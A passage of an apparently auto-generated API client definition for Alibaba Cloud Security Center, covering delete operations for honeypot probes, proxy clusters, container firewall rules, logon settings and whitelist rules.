  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a specified honeypot template.
 *
 * @param request DeleteHoneypotPresetRequest
 * @return DeleteHoneypotPresetResponse
 */
async function deleteHoneypotPreset(request: DeleteHoneypotPresetRequest): DeleteHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotPresetWithOptions(request, runtime);
}

model DeleteHoneypotProbeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  probeId?: string(name='ProbeId', description='The ID of the probe.

> You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.

This parameter is required.', example='95f0f79c-f7e9-4b09-a6e3-95a4cb6d****'),
}

model DeleteHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7FD1C1DC-AA67-510A-A022-5D23310C3658'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteHoneypotProbeResponseBody(name='body'),
}

/**
 * @summary Deletes a specified probe.
 *
 * @param request DeleteHoneypotProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteHoneypotProbeResponse
 */
async function deleteHoneypotProbeWithOptions(request: DeleteHoneypotProbeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a specified probe.
 *
 * @param request DeleteHoneypotProbeRequest
 * @return DeleteHoneypotProbeResponse
 */
async function deleteHoneypotProbe(request: DeleteHoneypotProbeRequest): DeleteHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotProbeWithOptions(request, runtime);
}

model DeleteHoneypotProbeBindRequest {
  bindId?: string(name='BindId', description='The unique ID of the bound service.', example='aa20815f-f0f3-4e3b-8e13-55771742****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  probeId?: string(name='ProbeId', description='The probe ID.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='aa234650-cfcf-4e25-b61f-c58f603f****'),
}

model DeleteHoneypotProbeBindResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteHoneypotProbeBindResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteHoneypotProbeBindResponseBody(name='body'),
}

/**
 * @summary Delete the probe service.
 *
 * @param request DeleteHoneypotProbeBindRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteHoneypotProbeBindResponse
 */
async function deleteHoneypotProbeBindWithOptions(request: DeleteHoneypotProbeBindRequest, runtime: Util.RuntimeOptions): DeleteHoneypotProbeBindResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bindId)) {
    query['BindId'] = request.bindId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotProbeBind',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Delete the probe service.
 *
 * @param request DeleteHoneypotProbeBindRequest
 * @return DeleteHoneypotProbeBindResponse
 */
async function deleteHoneypotProbeBind(request: DeleteHoneypotProbeBindRequest): DeleteHoneypotProbeBindResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotProbeBindWithOptions(request, runtime);
}

model DeleteHybridProxyRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster.

This parameter is required.', example='test'),
  uuid?: string(name='Uuid', description='The UUID of the proxy node that you want to remove. The value starts with inet-proxy.

This parameter is required.', example='inet-proxy-d2d94e8b-bb25-4744-8004-1e08a53c****'),
}

model DeleteHybridProxyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model DeleteHybridProxyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteHybridProxyResponseBody(name='body'),
}

/**
 * @summary Removes a proxy node from a specified proxy cluster.
 *
 * @param request DeleteHybridProxyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteHybridProxyResponse
 */
async function deleteHybridProxyWithOptions(request: DeleteHybridProxyRequest, runtime: Util.RuntimeOptions): DeleteHybridProxyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHybridProxy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Removes a proxy node from a specified proxy cluster.
 *
 * @param request DeleteHybridProxyRequest
 * @return DeleteHybridProxyResponse
 */
async function deleteHybridProxy(request: DeleteHybridProxyRequest): DeleteHybridProxyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHybridProxyWithOptions(request, runtime);
}

model DeleteHybridProxyClusterRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster.

This parameter is required.', example='proxy'),
}

model DeleteHybridProxyClusterResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='414EC213-AD2D-56C3-B140-108773B24405'),
}

model DeleteHybridProxyClusterResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteHybridProxyClusterResponseBody(name='body'),
}

/**
 * @summary Deletes a proxy cluster based on the name of the proxy cluster.
 *
 * @param request DeleteHybridProxyClusterRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteHybridProxyClusterResponse
 */
async function deleteHybridProxyClusterWithOptions(request: DeleteHybridProxyClusterRequest, runtime: Util.RuntimeOptions): DeleteHybridProxyClusterResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHybridProxyCluster',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a proxy cluster based on the name of the proxy cluster.
 *
 * @param request DeleteHybridProxyClusterRequest
 * @return DeleteHybridProxyClusterResponse
 */
async function deleteHybridProxyCluster(request: DeleteHybridProxyClusterRequest): DeleteHybridProxyClusterResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHybridProxyClusterWithOptions(request, runtime);
}

model DeleteIdcProbeRequest {
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='inet-1234567****'),
}

model DeleteIdcProbeResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
}

model DeleteIdcProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteIdcProbeResponseBody(name='body'),
}

/**
 * @summary Deletes an IDC probe that is created in Security Center.
 *
 * @param request DeleteIdcProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteIdcProbeResponse
 */
async function deleteIdcProbeWithOptions(request: DeleteIdcProbeRequest, runtime: Util.RuntimeOptions): DeleteIdcProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteIdcProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes an IDC probe that is created in Security Center.
 *
 * @param request DeleteIdcProbeRequest
 * @return DeleteIdcProbeResponse
 */
async function deleteIdcProbe(request: DeleteIdcProbeRequest): DeleteIdcProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteIdcProbeWithOptions(request, runtime);
}

model DeleteImageEventOperationRequest {
  id?: long(name='Id', description='The primary key of the alert handling rule.', example='1404656'),
}

model DeleteImageEventOperationResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    id?: long(name='Id', description='The primary key of the alert handling rule.', example='443496'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteImageEventOperationResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteImageEventOperationResponseBody(name='body'),
}

/**
 * @summary Deletes an alert handling rule.
 *
 * @param request DeleteImageEventOperationRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteImageEventOperationResponse
 */
async function deleteImageEventOperationWithOptions(request: DeleteImageEventOperationRequest, runtime: Util.RuntimeOptions): DeleteImageEventOperationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteImageEventOperation',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes an alert handling rule.
 *
 * @param request DeleteImageEventOperationRequest
 * @return DeleteImageEventOperationResponse
 */
async function deleteImageEventOperation(request: DeleteImageEventOperationRequest): DeleteImageEventOperationResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteImageEventOperationWithOptions(request, runtime);
}

model DeleteImageVulWhitelistRequest {
  ids?: string(name='Ids', description='The ID of the whitelist. Separate multiple IDs with commas (,).', example='123'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DeleteImageVulWhitelistResponseBody = {
  code?: string(name='Code', description='The response code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether the image vulnerability whitelist is deleted. Valid values:

*   **true**
*   **false**', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteImageVulWhitelistResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteImageVulWhitelistResponseBody(name='body'),
}

/**
 * @summary Deletes an image vulnerability whitelist.
 *
 * @param request DeleteImageVulWhitelistRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteImageVulWhitelistResponse
 */
async function deleteImageVulWhitelistWithOptions(request: DeleteImageVulWhitelistRequest, runtime: Util.RuntimeOptions): DeleteImageVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteImageVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes an image vulnerability whitelist.
 *
 * @param request DeleteImageVulWhitelistRequest
 * @return DeleteImageVulWhitelistResponse
 */
async function deleteImageVulWhitelist(request: DeleteImageVulWhitelistRequest): DeleteImageVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteImageVulWhitelistWithOptions(request, runtime);
}

model DeleteInstallCodeRequest {
  captchaCode?: string(name='CaptchaCode', description='The installation command.

>  You can call the [DescribeInstallCodes](~~DescribeInstallCodes~~) operation to query installation commands.

This parameter is required.', example='1q****'),
}

model DeleteInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model DeleteInstallCodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteInstallCodeResponseBody(name='body'),
}

/**
 * @summary Deletes the command that is used to install the Security Center agent.
 *
 * @param request DeleteInstallCodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteInstallCodeResponse
 */
async function deleteInstallCodeWithOptions(request: DeleteInstallCodeRequest, runtime: Util.RuntimeOptions): DeleteInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.captchaCode)) {
    query['CaptchaCode'] = request.captchaCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the command that is used to install the Security Center agent.
 *
 * @param request DeleteInstallCodeRequest
 * @return DeleteInstallCodeResponse
 */
async function deleteInstallCode(request: DeleteInstallCodeRequest): DeleteInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInstallCodeWithOptions(request, runtime);
}

model DeleteInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.

This parameter is required.', example='cdf629147cc3747d292a3f587xxxxxxxx'),
  ruleIds?: [ long ](name='RuleIds', description='The IDs of the rules that you want to delete.'),
}

model DeleteInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
}

model DeleteInterceptionRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteInterceptionRuleResponseBody(name='body'),
}

/**
 * @summary Deletes a defense rule in the container firewall module.
 *
 * @param request DeleteInterceptionRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteInterceptionRuleResponse
 */
async function deleteInterceptionRuleWithOptions(request: DeleteInterceptionRuleRequest, runtime: Util.RuntimeOptions): DeleteInterceptionRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a defense rule in the container firewall module.
 *
 * @param request DeleteInterceptionRuleRequest
 * @return DeleteInterceptionRuleResponse
 */
async function deleteInterceptionRule(request: DeleteInterceptionRuleRequest): DeleteInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionRuleWithOptions(request, runtime);
}

model DeleteInterceptionTargetRequest {
  targetIds?: string(name='TargetIds', description='The IDs of the network objects that you want to remove. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the IDs of the network objects.

This parameter is required.', example='1,11,111'),
}

model DeleteInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
  result?: boolean(name='Result', description='Indicates whether the network objects are removed. Valid values:

*   **true**: The network objects are removed.
*   **false**: The network objects fail to be removed.', example='true'),
}

model DeleteInterceptionTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteInterceptionTargetResponseBody(name='body'),
}

/**
 * @summary Removes the network objects that are in effect in the container firewall.
 *
 * @param request DeleteInterceptionTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteInterceptionTargetResponse
 */
async function deleteInterceptionTargetWithOptions(request: DeleteInterceptionTargetRequest, runtime: Util.RuntimeOptions): DeleteInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetIds)) {
    query['TargetIds'] = request.targetIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Removes the network objects that are in effect in the container firewall.
 *
 * @param request DeleteInterceptionTargetRequest
 * @return DeleteInterceptionTargetResponse
 */
async function deleteInterceptionTarget(request: DeleteInterceptionTargetRequest): DeleteInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionTargetWithOptions(request, runtime);
}

model DeleteK8sAccessInfoRequest {
  aliyunYundunGatewayApiName?: string(name='AliyunYundunGatewayApiName', description='This parameter is deprecated.', example='None'),
  aliyunYundunGatewayPopName?: string(name='AliyunYundunGatewayPopName', description='This parameter is deprecated.', example='None'),
  aliyunYundunGatewayProjectName?: string(name='AliyunYundunGatewayProjectName', description='This parameter is deprecated.', example='None'),
  id?: long(name='Id', description='The ID generated when Kubernetes is connected. You can call the GenerateK8sAccessInfo operation to query the ID.

This parameter is required.', example='200'),
}

model DeleteK8sAccessInfoResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid value:

*   **true**
*   **false**', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='C5338DE5-5D80-51A1-B330-98300AFB80E9'),
}

model DeleteK8sAccessInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteK8sAccessInfoResponseBody(name='body'),
}

/**
 * @summary Deletes the Kubernetes access information.
 *
 * @param request DeleteK8sAccessInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteK8sAccessInfoResponse
 */
async function deleteK8sAccessInfoWithOptions(request: DeleteK8sAccessInfoRequest, runtime: Util.RuntimeOptions): DeleteK8sAccessInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliyunYundunGatewayApiName)) {
    query['AliyunYundunGatewayApiName'] = request.aliyunYundunGatewayApiName;
  }
  if (!Util.isUnset(request.aliyunYundunGatewayPopName)) {
    query['AliyunYundunGatewayPopName'] = request.aliyunYundunGatewayPopName;
  }
  if (!Util.isUnset(request.aliyunYundunGatewayProjectName)) {
    query['AliyunYundunGatewayProjectName'] = request.aliyunYundunGatewayProjectName;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteK8sAccessInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the Kubernetes access information.
 *
 * @param request DeleteK8sAccessInfoRequest
 * @return DeleteK8sAccessInfoResponse
 */
async function deleteK8sAccessInfo(request: DeleteK8sAccessInfoRequest): DeleteK8sAccessInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteK8sAccessInfoWithOptions(request, runtime);
}

model DeleteLoginBaseConfigRequest {
  config?: string(name='Config', description='The content of the logon security settings to delete. The content varies based on the type of the logon security settings. Valid values:

*   **login_common_ip**: approved logon IP addresses

Example: {"ip":"10.23.23.23"}.

*   **login_common_time**: approved logon time ranges

Example: {"startTime":"06:00:00","endTime":"16:00:00"}.

*   **login_common_account**: approved logon accounts

Example: {"account":"test_account_001"}.

*   **login_common_location**: approved logon locations

Example: {"location":"Shanghai"}.

This parameter is required.', example='{"startTime":"06:00:00","endTime":"16:00:00"}'),
  target?: string(name='Target', description='The UUID of the server whose logon security settings you want to delete.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  type?: string(name='Type', description='The type of the logon security settings to delete. Valid values:

*   **login_common_ip**: approved logon IP addresses
*   **login_common_time**: approved logon time ranges
*   **login_common_account**: approved logon accounts
*   **login_common_location**: approved logon locations

This parameter is required.', example='login_common_time'),
}

model DeleteLoginBaseConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteLoginBaseConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteLoginBaseConfigResponseBody(name='body'),
}

/**
 * @summary Deletes the basic configuration information from the logon security configurations for a specific asset.
 *
 * @param request DeleteLoginBaseConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteLoginBaseConfigResponse
 */
async function deleteLoginBaseConfigWithOptions(request: DeleteLoginBaseConfigRequest, runtime: Util.RuntimeOptions): DeleteLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the basic configuration information from the logon security configurations for a specific asset.
 *
 * @param request DeleteLoginBaseConfigRequest
 * @return DeleteLoginBaseConfigResponse
 */
async function deleteLoginBaseConfig(request: DeleteLoginBaseConfigRequest): DeleteLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteLoginBaseConfigWithOptions(request, runtime);
}

model DeleteMaliciousFileWhitelistConfigRequest {
  configId?: long(name='ConfigId', description='The ID of the alert whitelist rule of sensitive files that are detected by using the agentless detection feature. You can call the [ListMaliciousFileWhitelistConfigs](~~ListMaliciousFileWhitelistConfigs~~) operation to query the IDs of alert whitelist rules.', example='1'),
}

model DeleteMaliciousFileWhitelistConfigResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteMaliciousFileWhitelistConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteMaliciousFileWhitelistConfigResponseBody(name='body'),
}

/**
 * @summary Deletes a whitelist rule for alerts generated for sensitive files that are detected by using the agentless detection feature.
 *
 * @param request DeleteMaliciousFileWhitelistConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteMaliciousFileWhitelistConfigResponse
 */
async function deleteMaliciousFileWhitelistConfigWithOptions(request: DeleteMaliciousFileWhitelistConfigRequest, runtime: Util.RuntimeOptions): DeleteMaliciousFileWhitelistConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteMaliciousFileWhitelistConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a whitelist rule for alerts generated for sensitive files that are detected by using the agentless detection feature.
 *
 * @param request DeleteMaliciousFileWhitelistConfigRequest
 * @return DeleteMaliciousFileWhitelistConfigResponse
 */
async function deleteMaliciousFileWhitelistConfig(request: DeleteMaliciousFileWhitelistConfigRequest): DeleteMaliciousFileWhitelistConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteMaliciousFileWhitelistConfigWithOptions(request, runtime);
}

model DeleteMaliciousNoteRequest {
